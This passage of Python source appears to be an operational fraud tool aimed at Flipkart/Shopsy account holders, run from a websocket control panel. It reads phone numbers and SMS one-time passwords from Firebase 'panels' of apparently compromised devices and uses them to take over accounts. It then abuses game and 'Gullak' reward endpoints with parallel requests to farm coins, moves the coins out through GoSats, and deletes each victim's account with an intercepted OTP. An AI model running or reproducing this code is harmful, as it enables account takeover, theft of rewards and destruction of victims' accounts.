        response_ctx = data.get("RESPONSE", {}).get("actionResponseContext", {})
        if response_ctx.get("authenticationSuccess"):
            await self.emit("otp_verified" if not signup else "signup_success", {"account_id": self.ctx.account_id})
            log.ok(f"{'Signup' if signup else 'Login'} successful | account={self.ctx.account_id}")
            return True
        error_msg = response_ctx.get("errorMessage", {}).get("message", {}).get("text", "")
        if "Incorrect OTP" in error_msg or "invalid" in error_msg.lower():
            log.warn(f"Wrong OTP: {error_msg}")
            return False
        if "Account does not exist" in error_msg:
            raise RuntimeError("Account does not exist (deleted)")
        raise RuntimeError(f"{'Signup' if signup else 'Login'} failed: {data}")

    # ============================================================
    # IMPROVED OTP POLLING – with timeout & poll_interval, improved regex
    # trigger_time: OTP messages with timestamp >= trigger_time are considered
    # ============================================================
    async def poll_otp_from_panel(self, firebase_url: str, device_id: str, sender_keyword: str,
                                   timeout: int = OTP_TIMEOUT, poll_interval: float = 1.0,
                                   trigger_time: Optional[int] = None) -> Optional[str]:
        if trigger_time is None:
            trigger_time = int(time.time() * 1000)
        start = time.time()
        async with aiohttp.ClientSession() as session:
            while time.time() - start < timeout:
                try:
                    async with session.get(f"{firebase_url}messages/{device_id}.json") as resp:
                        if resp.status != 200:
                            await asyncio.sleep(poll_interval)
                            continue
                        msgs = await resp.json()
                        if not msgs:
                            await asyncio.sleep(poll_interval)
                            continue
                        # Sort messages by key (timestamp) descending
                        for msg_id in sorted(msgs.keys(), reverse=True):
                            msg_data = msgs[msg_id]
                            if not isinstance(msg_data, dict):
                                continue
                            # Get message timestamp
                            msg_ts = None
                            if "timestamp" in msg_data:
                                msg_ts = msg_data["timestamp"]
                            elif "time" in msg_data:
                                msg_ts = msg_data["time"]
                            else:
                                try:
                                    # Fallback: parse Firebase key as integer (numeric keys)
                                    msg_ts = int(msg_id)
                                except (ValueError, TypeError):
                                    continue  # cannot determine timestamp, skip
                            if msg_ts < trigger_time:
                                continue
                            sender = msg_data.get("sender", "")
                            if sender_keyword.lower() in sender.lower():
                                body = msg_data.get("body") or msg_data.get("message") or ""
                                match = re.search(r'\b(\d{4}|\d{6})\b', body)
                                if match:
                                    log.info(f"Found OTP for {device_id} from {sender}: {match.group(0)}")
                                    return match.group(0)
                        await asyncio.sleep(poll_interval)
                except Exception as e:
                    log.warn(f"Error polling OTP for {device_id}: {e}")
                    await asyncio.sleep(poll_interval)
        # Debug: show last few messages if OTP not found
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{firebase_url}messages/{device_id}.json") as resp:
                    if resp.status == 200:
                        msgs = await resp.json()
                        log.warn(f"OTP not found. Messages for {device_id}: {list(msgs.keys())[-5:] if msgs else 'None'}")
        except:
            pass
        return None

    # ---------- ORDER HISTORY ----------
    async def fetch_order_history(self, page: int = 1) -> dict:
        await self.emit("order_fetching")
        log.info(f"Fetching order history - Page {page}...")
        payload = {
            "requestContext": {
                "type": "MY_ORDER_PAGE",
                "pageView": "",
                "queryTime": "",
                "cxTenant": "cs",
                "pageName": "",
                "pageNumber": page,
                "salesAppFilter": "FLIPKART,SLAP"
            },
            "pageType": "MY_ORDER_PAGE",
            "pageUri": "/cx/my_orders",
            "pageContext": {
                "pageHashKey": None,
                "slotContextMap": None,
                "paginationContextMap": None,
                "paginatedFetch": False,
                "pageNumber": page,
                "fetchAllPages": False,
                "networkSpeed": 0,
                "trackingContext": None,
                "fetchSeoData": False
            },
            "locationContext": {"pincode": ""}
        }
        data = await self._post_json("/api/4/page/fetch", payload)
        await self.emit("order_fetched")
        return data

    def extract_orders_from_response(self, data: dict) -> List[dict]:
        orders = []
        try:
            response_data = data.get("RESPONSE", data)
            params = response_data.get("params", {})
            xtrasaver = params.get("xtrasaverSalesExp", {})
            order_ids = set()
            for key in xtrasaver.keys():
                if key.startswith("OD"):
                    order_ids.add(key)
            response_str = json.dumps(response_data)
            od_matches = re.findall(r'"OD\d+"', response_str)
            for match in od_matches:
                order_ids.add(match.strip('"'))
            for order_id in order_ids:
                order_info = self._extract_order_from_response(response_data, order_id)
                if order_info:
                    orders.append(order_info)
            if not orders:
                orders = self._extract_orders_from_raw(response_data)
            log.info(f"Extracted {len(orders)} orders")
        except Exception as e:
            log.error(f"Error extracting orders: {e}")
        return orders

    def _extract_order_from_response(self, response_data: dict, order_id: str) -> Optional[dict]:
        try:
            response_str = json.dumps(response_data)
            order_date = None
            for pattern in [
                r'"orderDate":\s*(\d+)',
                r'"placedDate":\s*(\d+)',
                r'"createdAt":\s*(\d+)',
                r'"eventDate":\s*(\d+)',
                r'"actualDeliveredDate":\s*(\d+)',
            ]:
                matches = re.findall(pattern, response_str)
                for match in matches:
                    try:
                        ts = int(match)
                        if ts > 100000000000:
                            ts = ts / 1000
                        dt = datetime.fromtimestamp(ts)
                        if 2023 <= dt.year <= 2027:
                            order_date = ts
                            break
                    except:
                        continue
                if order_date:
                    break
            order_status = "Unknown"
            for pattern in [
                r'"status":\s*{[^}]*"text":\s*"([^"]+)"',
                r'"orderStatus":\s*"([^"]+)"',
                r'"status":\s*{[^}]*"vernacularKey":\s*"([^"]+)"',
            ]:
                matches = re.findall(pattern, response_str)
                if matches:
                    order_status = matches[0]
                    break
            products = []
            for pattern in [r'"title":\s*"([^"]+)"[^}]*"brand":\s*"([^"]+)"',
                            r'"title":\s*"([^"]+)"[^}]*"brandName":\s*"([^"]+)"']:
                matches = re.findall(pattern, response_str)
                for title, brand in matches[:5]:
                    if title and len(title) > 3:
                        products.append({"product_name": title, "brand": brand or "Unknown", "quantity": 1})
                if products:
                    break
            total_amount = 0
            for pattern in [r'"totalAmount":\s*([\d.]+)', r'"amount":\s*([\d.]+)', r'"totalPrice":\s*([\d.]+)']:
                matches = re.findall(pattern, response_str)
                if matches:
                    try:
                        total_amount = float(matches[0])
                        break
                    except:
                        continue
            if order_date:
                return {
                    "order_id": order_id,
                    "order_status": order_status,
                    "order_date": order_date,
                    "items": products,
                    "total_amount": total_amount
                }
            return None
        except Exception:
            return None

    def _extract_orders_from_raw(self, data: Any) -> List[dict]:
        orders = []
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, str) and value.startswith("OD") and len(value) >= 20:
                    info = self._extract_order_from_response(data, value)
                    if info:
                        orders.append(info)
                elif isinstance(value, (dict, list)):
                    orders.extend(self._extract_orders_from_raw(value))
        elif isinstance(data, list):
            for item in data:
                orders.extend(self._extract_orders_from_raw(item))
        return orders

    async def get_latest_order(self) -> Optional[dict]:
        try:
            data = await self.fetch_order_history(1)
        except Exception as e:
            log.warn(f"Could not fetch order history: {e}. Treating as no orders (eligible).")
            return None
        orders = self.extract_orders_from_response(data)
        if not orders:
            return None
        def get_date(order):
            d = order.get("order_date")
            if d:
                if isinstance(d, (int, float)):
                    if d > 100000000000:
                        d = d / 1000
                    return datetime.fromtimestamp(d)
            return datetime.min
        orders.sort(key=get_date, reverse=True)
        return orders[0]

    def check_deletion_eligibility(self, order_date) -> Tuple[bool, str, Optional[datetime]]:
        if not order_date:
            return True, "ELIGIBLE - No orders found (new account)", None
        try:
            if isinstance(order_date, (int, float)):
                if order_date > 100000000000:
                    order_date = order_date / 1000
                dt = datetime.fromtimestamp(order_date)
            elif isinstance(order_date, str) and order_date.isdigit():
                ts = int(order_date)
                if ts > 100000000000:
                    ts = ts / 1000
                dt = datetime.fromtimestamp(ts)
            else:
                return True, "ELIGIBLE - Could not parse date", None
            threshold = datetime.now() - timedelta(days=ELIGIBILITY_DAYS)
            days_old = (datetime.now() - dt).days
            if dt < threshold:
                return True, f"ELIGIBLE - {days_old} days old (>{ELIGIBILITY_DAYS} days)", dt
            else:
                return False, f"NOT ELIGIBLE - {days_old} days old (<{ELIGIBILITY_DAYS} days)", dt
        except Exception as e:
            return True, f"ELIGIBLE (fallback) - {e}", None

    # ---------- GAME EXPLOIT ----------
    async def games_api(self, route_uri: str, method: str, payload: dict) -> dict:
        body = {"requestMethod": method, "routeUri": route_uri, "payload": payload}
        return await self._post_json("/1/shopsy/games", body, game=True)

    async def get_user(self, refresh: bool = False) -> dict:
        if not self.ctx.account_id:
            raise RuntimeError("Account ID missing")
        if self._user_cache and not refresh:
            return self._user_cache
        data = await self.games_api(
            "user/get-user", "GET",
            {"userId": self.ctx.account_id, "userName": self.ctx.user_name or "User"}
        )
        if not data.get("success"):
            raise RuntimeError(f"get-user failed: {data}")
        self._user_cache = data["data"]
        return self._user_cache

    async def start_game(self, game: dict) -> str:
        start = await self.games_api(
            "game/game-started", "POST",
            {"userId": self.ctx.account_id, "gameId": game["id"]}
        )
        if not start.get("success"):
            raise RuntimeError(f"Game start failed: {start}")
        return start["data"]["sessionId"]

    async def end_game(self, game: dict, session_id: str, play_time: int) -> dict:
        return await self.games_api(
            "game/game-ended", "POST",
            {
                "userId": self.ctx.account_id,
                "gameId": game["id"],
                "sessionId": session_id,
                "gemsEarned": game["gems"],
                "playTimeInSec": play_time,
            }
        )

    async def _play_seconds(self, game: dict) -> int:
        if not self.fast:
            return game["play_time"]
        if game["play_time"] >= 60:
            return game["play_time"]
        return min(game["play_time"], FAST_PLAY_SEC)

    async def claim_gullak(self, label: str = "Gullak") -> Optional[dict]:
        await self.emit("gullak_claiming", {"label": label})
        log.info(f"{label} claim...")
        data = await self.games_api(
            "gullak/claim-gullak", "POST",
            {"userId": self.ctx.account_id}
        )
        if not data.get("success"):
            log.warn(f"{label} skip/fail: {data}")
            return None
        self._user_cache = None
        return data["data"]

    async def parallel_game_exploit(self, game: dict, parallel_count: int) -> Tuple[int, List[str]]:
        logs = []
        game_id = game["id"]
        name = game["name"]
        logs.append(f"Starting {name} × {parallel_count} parallel")
        await self.emit("game_start", {"game": name, "parallel": parallel_count})
        try:
            user = await self.get_user(refresh=True)
            for g in user.get("gameStats", {}).get("games", []):
                if g.get("gameId") == game_id and g.get("rewards", {}).get("isMaxGameBonusEarned"):
                    logs.append(f"{name} already done today. Skipping.")
                    await self.emit("game_skip", {"game": name})
                    return 0, logs
        except Exception as e:
            logs.append(f"Could not check game status: {e}")
        play_time = await self._play_seconds(game)
        start_tasks = [self.start_game(game) for _ in range(parallel_count)]
        sessions = []
        for result in await asyncio.gather(*start_tasks, return_exceptions=True):
            if isinstance(result, Exception):
                logs.append(f"Session start failed: {result}")
            else:
                sessions.append(result)
        if not sessions:
            logs.append("No sessions started")
            return 0, logs
        logs.append(f"Started {len(sessions)} sessions")
        end_tasks = [self.end_game(game, s, play_time) for s in sessions]
        total = 0
        success = 0
        for future in asyncio.as_completed(end_tasks):
            try:
                result = await future
                if result.get("success"):
                    coins = result["data"].get("coinsEarnedForGame", 0)
                    total += coins
                    success += 1
                    logs.append(f"Session +{coins} coins")
                else:
                    logs.append(f"Session failed: {result}")
            except Exception as e:
                logs.append(f"Session error: {e}")
        self._user_cache = None
        logs.append(f"{name}: {success}/{len(sessions)} successful, total {total} coins")
        await self.emit("game_done", {"game": name, "coins": total, "success": success})
        return total, logs

    async def run_all_games(self) -> Tuple[int, List[str]]:
        total = 0
        all_logs = []
        await self.emit("games_starting")
        for game in GAMES:
            try:
                coins, logs = await self.parallel_game_exploit(game, FIXED_CONCURRENCY)
                total += coins
                all_logs.extend(logs)
            except Exception as e:
                log.warn(f"Game {game['name']} failed: {e}, continuing...")
            await asyncio.sleep(0.1)
        await self.emit("games_done", {"total_coins": total})
        return total, all_logs

    async def run_gullak_exploit(self) -> Tuple[int, List[str]]:
        logs = []
        await self.emit("gullak_starting")
        tasks = [self.claim_gullak(f"Gullak {i+1}") for i in range(10)]
        total = 0
        for future in asyncio.as_completed(tasks):
            try:
                result = await future
                if result:
                    coins = result.get("loginRewardCoinsClaimed", 0) + result.get("gameRewardCoinsClaimed", 0)
                    total += coins
                    logs.append(f"Gullak +{coins} coins")
            except Exception as e:
                logs.append(f"Gullak error: {e}")
        logs.append(f"Gullak total coins: {total}")
        await self.emit("gullak_done", {"total_coins": total})
        return total, logs

# ===================== SHOPSY DELETE CLIENT (modified to allow single request) =====================
class ShopsyDeleteClient:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.device_id = uuid.uuid4().hex
        self.visit_id = f"{uuid.uuid4().hex}-{int(time.time() * 1000)}"
        self.dc_id = "2"
        self.at = self.sn = self.secure_token = self.secure_cookie = self.ud = self.vd = ""
        self.account_id = self.user_name = self.phone = self.email = ""

    def import_session(self, tokens: dict) -> bool:
        try:
            self.at = tokens.get('at', '')
            self.sn = tokens.get('sn', '')
            self.secure_token = tokens.get('secureToken', '')
            self.secure_cookie = tokens.get('secureCookie', '')
            self.ud = tokens.get('ud', '')
            self.vd = tokens.get('vd', '')
            self.account_id = tokens.get('accountId', '')
            self.user_name = tokens.get('userName', 'User')
            self.phone = tokens.get('phone', '')
            self.email = tokens.get('email', '')
            if not self.at or not self.sn:
                return False
            return True
        except Exception:
            return False

    def _build_cookie(self) -> str:
        cookies = []
        if self.ud: cookies.append(f"ud={self.ud}")
        if self.vd: cookies.append(f"vd={self.vd}")
        return "; ".join(cookies)

    def _get_headers(self) -> dict:
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 26_5 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27; fk_ios_app FKUA/Retail/11.13.1/iOS/Mobile",
            "x-user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 26_5 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27; fk_ios_app FKUA/Retail/11.13.1/iOS/Mobile",
            "flipkart_secure": "true",
        }
        if self.at: headers["at"] = self.at
        if self.sn: headers["sn"] = self.sn
        if self.secure_token: headers["secureToken"] = self.secure_token
        if self.secure_cookie:
            headers["securecookie"] = self.secure_cookie
            headers["sc"] = self.secure_cookie
        cookie = self._build_cookie()
        if cookie: headers["Cookie"] = cookie
        return headers

    # Modified to allow a max_retries parameter (default 1 for delete OTP)
    def _post(self, url: str, payload: dict, max_retries: int = 1) -> Optional[dict]:
        headers = self._get_headers()
        for attempt in range(max_retries):
            try:
                resp = self.session.post(url, json=payload, headers=headers, timeout=10)
                if resp.status_code == 200:
                    return resp.json()
                if resp.status_code == 406:
                    try:
                        data = resp.json()
                        new_dc = None
                        if "RESPONSE" in data and isinstance(data["RESPONSE"], dict):
                            new_dc = data["RESPONSE"].get("id")
                        if not new_dc and "META_INFO" in data:
                            new_dc = data["META_INFO"].get("dcInfo", {}).get("id")
                        if new_dc and str(new_dc) != self.dc_id:
                            self.dc_id = str(new_dc)
                            url = f"https://{self.dc_id}.rome.api.flipkart.com/1/action/view"
                            continue
                    except:
                        pass
                if resp.status_code == 206:
                    log.error("AT expired. Need re-login.")
                    return None
                if resp.status_code >= 400:
                    log.error(f"Request error {resp.status_code}")
                    return None
            except Exception:
                if attempt == max_retries - 1:
                    return None
                time.sleep(0.2)
        return None

    def _get_url(self) -> str:
        return f"https://{self.dc_id}.rome.api.flipkart.com/1/action/view"

    def verify_account_delete(self) -> bool:
        data = self._post(self._get_url(), {"actionRequestContext": {"type": "VERIFY_ACCOUNT_DELETE"}}, max_retries=3)
        return data and data.get("RESPONSE", {}).get("actionSuccess", False)

    def request_delete_otp(self) -> Optional[str]:
        # Use max_retries=1 to avoid sending multiple OTP requests
        data = self._post(self._get_url(), {"actionRequestContext": {"type": "ACCOUNT_DELETE_GENERATE_OTP"}}, max_retries=1)
        if data:
            flow = data.get("RESPONSE", {}).get("actionResponseContext", {}).get("flowInstanceId")
            if not flow:
                flow = data.get("actionResponseContext", {}).get("flowInstanceId")
            if flow:
                log.info(f"Delete OTP requested, flow={flow[:20]}...")
                return flow
        return None

    def verify_delete_otp(self, flow_instance_id: str, otp: str) -> bool:
        data = self._post(self._get_url(), {
            "actionRequestContext": {
                "type": "ACCOUNT_DELETE_VERIFY_OTP",
                "flowInstanceId": flow_instance_id,
                "otp": otp,
                "customerGrievance": ""
            }
        }, max_retries=3)
        if data and data.get("RESPONSE", {}).get("actionSuccess", False):
            log.ok(f"Account {self.account_id} deleted!")
            return True
        return False

# ------------------- PANEL HELPERS -------------------
def parse_panel_link(link: str) -> Optional[Tuple[str, str]]:
    if "?s=" in link:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if 's' in qs:
            s_param = qs['s'][0]
            s_param += "=" * ((4 - len(s_param) % 4) % 4)
            try:
                decoded = base64.b64decode(s_param).decode('utf-8')
                for sep in ['|||', '|']:
                    if sep in decoded:
                        parts = decoded.split(sep)
                        if len(parts) >= 2:
                            firebase_url = parts[0].strip()
                            api_key = parts[1].strip()
                            if firebase_url and api_key:
                                if not firebase_url.endswith('/'):
                                    firebase_url += '/'
                                return firebase_url, api_key
            except:
                pass
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if not link.endswith('/'):
            link += '/'
        return link, None
    return None

def fetch_phone_from_device_id(panel: dict, device_id: str) -> Optional[str]:
    url = panel["url"]
    try:
        resp = requests.get(f"{url}clients/{device_id}.json", timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            if data:
                phone = data.get("mobNo") or data.get("phone") or data.get("mobile")
                if phone:
                    phone = re.sub(r'\D', '', phone)
                    if len(phone) == 10 and phone[0] in "6789":
                        return phone
        resp = requests.get(f"{url}messages/{device_id}.json", timeout=3)
        if resp.status_code == 200:
            msgs = resp.json() or {}
            for msg in msgs.values():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                match = re.search(r'\b([6-9]\d{9})\b', text)
                if match:
                    return match.group(1)
        return None
    except:
        return None

def fetch_phones_from_panel(panel: dict, limit: int = MAX_DEVICES_FETCH) -> List[Tuple[str, str]]:
    url = panel["url"]
    try:
        clients_req = requests.get(url + 'clients.json', timeout=5)
        clients = clients_req.json() or {}
    except Exception as e:
        log.error(f"Failed to fetch clients from {panel['name']}: {e}")
        return []

    phones = []
    count = 0
    for c_id, c_data in clients.items():
        if count >= limit:
            break
        if not isinstance(c_data, dict):
            continue
        if not c_data.get("status"):
            continue
        phone = c_data.get("mobNo") or c_data.get("phone") or c_data.get("mobile")
        if not phone:
            try:
                msg_resp = requests.get(f"{url}messages/{c_id}.json", timeout=3)
                if msg_resp.status_code == 200:
                    msgs = msg_resp.json() or {}
                    for msg in msgs.values():
                        if not isinstance(msg, dict):
                            continue
                        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                        match = re.search(r'\b([6-9]\d{9})\b', text)
                        if match:
                            phone = match.group(1)
                            break
            except:
                pass
        if phone:
            phone = re.sub(r'\D', '', phone)
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                count += 1
    return phones

# ------------------- WEB SERVER -------------------
from aiohttp import web

task_inputs = {}
websocket_clients = set()
active_tasks = []
gosats_sessions = {}  # device_key -> GosatsClient

async def emit_to_all(status, data=None):
    message = json.dumps({"status": status, "data": data})
    for ws in list(websocket_clients):
        try:
            await ws.send_str(message)
        except:
            pass

async def ws_handler(request):
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    websocket_clients.add(ws)
    try:
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                data = json.loads(msg.data)
                if data.get('type') == 'start':
                    await handle_start(data, ws)
                elif data.get('type') == 'start_single':
                    await handle_start_single(data, ws)
                elif data.get('type') == 'stop_single':
                    await handle_stop_single(data, ws)
                elif data.get('type') == 'fetch_devices':
                    await handle_fetch_devices(data, ws)
                elif data.get('type') == 'input_response':
                    device_key = data.get('device')
                    value = data.get('value')
                    if device_key in task_inputs and not task_inputs[device_key].done():
                        task_inputs[device_key].set_result(value)
                elif data.get('type') == 'reset':
                    await handle_reset(data, ws)
                elif data.get('type') == 'stop':
                    for task in active_tasks:
                        if not task.done():
                            task.cancel()
                    active_tasks.clear()
                    await emit_to_all('status', {'device': 'system', 'status': 'stopped', 'message': 'All tasks stopped'})
            elif msg.type == aiohttp.WSMsgType.ERROR:
                log.error(f'WebSocket error: {ws.exception()}')
    finally:
        websocket_clients.remove(ws)
    return ws

async def handle_reset(data, ws):
    clear_all_sessions()
    gosats_sessions.clear()
    for task in active_tasks:
        if not task.done():
            task.cancel()
    active_tasks.clear()
    await emit_to_all('reset_done', {'message': 'All sessions cleared and tasks stopped.'})

async def handle_fetch_devices(data, ws):
    panels_data = data.get('panels', [])
    panels = []
    for link in panels_data:
        parsed = parse_panel_link(link)
        if parsed:
            firebase_url, api_key = parsed
            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0]
            if not name:
                name = f"Panel_{len(panels)+1}"
            panels.append({"name": name, "url": firebase_url, "sender": "FLPKRT"})
        else:
            await emit_to_all('error', {'message': f'Could not parse panel link: {link[:50]}...'})
    if not panels:
        await emit_to_all('error', {'message': 'No valid panels provided.'})
        return
    panel = panels[0]
    devices = fetch_phones_from_panel(panel, limit=MAX_DEVICES_FETCH)
    result = [{"phone": phone, "device": dev} for phone, dev in devices]
    await emit_to_all('devices_fetched', {'devices': result})

# ===================== PROCESS ONE =====================

async def process_one(phone: str, device: str, panel: dict, idx: int, total: int, is_single: bool = False, json_data: dict = None):
    device_key = f"{device}_{phone}"
    await emit_to_all('status', {'device': device_key, 'status': 'starting', 'phone': phone, 'index': idx+1, 'total': total})
    async def emit_cb(data):
        await emit_to_all('status', {'device': device_key, **data})

    client = AsyncShopsyClient(fast=True)
    client.set_emit_callback(emit_cb)
    try:
        async with client:
            # ----- Login Phase -----
            imported = False
            
            # ONLY use JSON import if explicitly provided (via json_data parameter)
            # This is for the "JSON Login" feature where user manually provides tokens
            if json_data:
                if client.import_session(json_data):
                    imported = True
                    await emit_to_all('status', {'device': device_key, 'status': 'login_success', 'message': 'JSON session loaded'})
                    log.ok(f"JSON session loaded for {device_key}")
            
            # NEVER load from file - always do OTP login if no JSON import
            if not imported:
                await client.bootstrap()
                request_id = await client.send_otp(phone)
                # Capture trigger time immediately after OTP request
                trigger_time = int(time.time() * 1000)
                # Small delay before polling to let OTP arrive
                await asyncio.sleep(1.5)
                otp = await client.poll_otp_from_panel(panel["url"], device, panel["sender"],
                                                       trigger_time=trigger_time)
                if not otp:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'OTP not received'})
                    return

                login_success = False
                for retry in range(MAX_OTP_RETRIES):
                    try:
                        login_success = await client.verify_otp(phone, otp, request_id, signup=False)
                        if login_success:
                            break
                        else:
                            await asyncio.sleep(0.5)
                            # Re‑poll with the same trigger_time to catch any delayed OTP
                            otp = await client.poll_otp_from_panel(panel["url"], device, panel["sender"],
                                                                   trigger_time=trigger_time)
                            if not otp:
                                break
                    except RuntimeError as e:
                        if "Account does not exist" in str(e):
                            try:
                                signup_success = await client.verify_otp(phone, otp, request_id, signup=True)
                                if signup_success:
                                    login_success = True
                                    break
                            except Exception as signup_err:
                                await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': f'Signup failed: {signup_err}'})
                                return
                        else:
                            raise

                if not login_success:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Login/Signup failed'})
                    return
                
                log.ok(f"OTP login successful for {device_key}")

            # ----- Check eligibility -----
            latest = await client.get_latest_order()
            if latest is None:
                eligible = True
            else:
                order_date = latest.get("order_date")
                eligible, msg, dt = client.check_deletion_eligibility(order_date)

            if not eligible:
                await emit_to_all('status', {'device': device_key, 'status': 'done', 'eligible': False, 'message': msg})
                return

            # ----- Play Flipkart games (FIRST) -----
            await emit_to_all('status', {'device': device_key, 'status': 'playing_games', 'eligible': True})
            game_coins, _ = await client.run_all_games()
            gullak_coins, _ = await client.run_gullak_exploit()
            total_coins = game_coins + gullak_coins

            # ----- Gosats login/swap (SECOND) -----
            await emit_to_all('status', {'device': device_key, 'status': 'gosats_login', 'message': 'Gosats setup...'})
            gosats = gosats_sessions.get(device_key)
            if not gosats or not gosats.logged_in:
                gosats = GosatsClient()
                gosats_sessions[device_key] = gosats
                if not gosats.send_otp("+91" + phone):
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Gosats OTP send failed'})
                    return
                # Capture trigger time immediately after Gosats OTP request
                gosats_trigger = int(time.time() * 1000)
                await asyncio.sleep(1.5)
                gosats_otp = await client.poll_otp_from_panel(panel["url"], device, "GOSATS",
                                                               timeout=GOSATS_OTP_TIMEOUT,
                                                               trigger_time=gosats_trigger)
                if not gosats_otp:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Gosats OTP not received'})
                    return
                ok, verify_data = gosats.verify_otp("+91" + phone, gosats_otp)
                if not ok:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Gosats OTP verification failed'})
                    return
                
                is_new = verify_data.get('isNewUser', False)
                if is_new:
                    await emit_to_all('status', {'device': device_key, 'status': 'gosats_new', 'message': 'New GoSats account detected. Onboarding...'})
                else:
                    await emit_to_all('status', {'device': device_key, 'status': 'gosats_logged_in', 'message': 'Existing account, logged in'})

                if is_new:
                    await emit_to_all('status', {'device': device_key, 'status': 'gosats_onboarding_start', 'message': 'Starting full onboarding with new KYC flow...'})
                    success, balance = await gosats_onboarding_full(
                        phone, gosats.token, panel, device, client
                    )
                    if success:
                        await emit_to_all('status', {'device': device_key, 'status': 'gosats_onboarded', 'message': f'Onboarding complete. Balance: {balance} SC'})
                    else:
                        await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Onboarding failed'})
                        return
                else:
                    # Force activate SuperCoins for ALL existing accounts
                    if not gosats.activate_supercoins():
                        log.warn("SuperCoins activation failed for existing account")
                    balance = gosats.get_balance()
                    await emit_to_all('status', {'device': device_key, 'status': 'gosats_logged_in', 'message': f'Balance: {balance} SC'})

            # ----- Swap coins using CORRECT logic from test-2.py -----
            balance = gosats.get_balance()
            if balance > 0:
                await emit_to_all('status', {'device': device_key, 'status': 'swapping', 'message': f'Swapping {balance} SC using correct endpoint...'})
                # Retry swap up to 3 times
                swap_success = False
                for attempt in range(3):
                    if gosats.swap_coins(balance):
                        swap_success = True
                        break
                    await asyncio.sleep(1)
                if swap_success:
                    await emit_to_all('status', {'device': device_key, 'status': 'swapping_completed', 'message': f'Swapped {balance} SC', 'coins': balance})
                    log.ok(f"Swap successful for {device_key}")
                else:
                    await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Swap failed after retries'})
                    return
            else:
                await emit_to_all('status', {'device': device_key, 'status': 'swapping_completed', 'message': 'No coins to swap', 'coins': 0})

            # ----- Automatic deletion – SINGLE ATTEMPT, 30‑second timeout -----
            await emit_to_all('status', {'device': device_key, 'status': 'deleting', 'message': 'Deleting account...'})
            # Get fresh tokens from current session (in memory)
            tokens = {
                'at': client.ctx.at,
                'sn': client.ctx.sn,
                'secureToken': client.ctx.secure_token,
                'secureCookie': client.ctx.secure_cookie,
                'ud': getattr(client.ctx, 'ud', ''),
                'vd': getattr(client.ctx, 'vd', ''),
                'accountId': client.ctx.account_id,
                'userName': client.ctx.user_name,
                'phone': client.ctx.phone,
                'email': client.ctx.email,
            }
            del_client = ShopsyDeleteClient()
            if not del_client.import_session(tokens):
                await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Delete import failed'})
                return
            if not del_client.verify_account_delete():
                await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Delete verify failed'})
                return

            # Request delete OTP once (no automatic retry), then poll for 30 seconds
            flow_id = del_client.request_delete_otp()
            if not flow_id:
                await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Delete OTP request failed'})
                return
            # Capture trigger time immediately after delete OTP request
            delete_trigger = int(time.time() * 1000)
            log.info(f"Delete OTP requested, flow={flow_id[:20]}...")
            # Wait 2 seconds before polling to let the OTP arrive
            await asyncio.sleep(2)
            # Poll with 30 seconds timeout, checking every 0.5 seconds
            delete_otp = await client.poll_otp_from_panel(
                panel["url"], device, panel["sender"],
                timeout=30, poll_interval=0.5,
                trigger_time=delete_trigger
            )
            if not delete_otp:
                await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Delete OTP not received within 30 seconds'})
                return

            if del_client.verify_delete_otp(flow_id, delete_otp):
                await emit_to_all('status', {'device': device_key, 'status': 'done', 'eligible': True, 'deleted': True, 'coins': total_coins, 'message': 'Deleted!'})
            else:
                await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': 'Delete OTP verification failed'})

    except asyncio.CancelledError:
        await emit_to_all('status', {'device': device_key, 'status': 'cancelled', 'message': 'Cancelled'})
    except Exception as e:
        await emit_to_all('status', {'device': device_key, 'status': 'error', 'message': str(e)})
    finally:
        if device_key in task_inputs:
            try:
                task_inputs[device_key].set_result(None)
            except:
                pass
            del task_inputs[device_key]

# ===================== HANDLERS =====================

async def handle_start(data, ws):
    panels_data = data.get('panels', [])
    phone_input = data.get('phone_input', [])
    mode = data.get('mode', 'full')
    devices_only = data.get('devices_only', False)
    global_json = data.get('json_data', None)
    per_device_json = data.get('per_device_json', {})  # dict: device_key -> json_data

    panels = []
    for link in panels_data:
        parsed = parse_panel_link(link)
        if parsed:
            firebase_url, api_key = parsed
            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0]
            if not name:
                name = f"Panel_{len(panels)+1}"
            panels.append({"name": name, "url": firebase_url, "sender": "FLPKRT"})
        else:
            await emit_to_all('error', {'message': f'Could not parse panel link: {link[:50]}...'})

    if not panels:
        await emit_to_all('error', {'message': 'No valid panels provided.'})
        return

    tasks = []
    for line in phone_input:
        if not line.strip():
            continue
        if devices_only:
            device = line.strip()
            phone = None
            for panel in panels:
                phone = fetch_phone_from_device_id(panel, device)
                if phone:
                    break
            if phone:
                tasks.append((phone, device, panels[0]))
            else:
